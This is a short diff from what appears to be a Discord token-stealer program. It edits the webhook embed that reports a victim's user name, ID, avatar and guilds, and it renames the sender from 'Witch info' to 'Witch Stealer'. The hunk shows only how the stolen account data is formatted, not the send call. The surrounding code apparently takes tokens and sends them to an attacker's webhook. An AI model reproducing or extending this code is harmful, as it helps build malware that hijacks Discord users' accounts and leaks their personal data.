@@ -266,10 +266,10 @@ def tokens(token: str):
             print("No HQ guilds found")
 
         embed = {
-            "username": "Witch info",
+            "username": "Witch Stealer",
             "avatar_url": __CONFIG__["avatar_link"],
             "embeds": [{
-                "title": f"{user_name} ({user_id}) info",
+                "title": f"{user_name} ({user_id})",
                 "color": 0x000000,
                 "fields": fields,
                 "thumbnail": {"url": avatar}
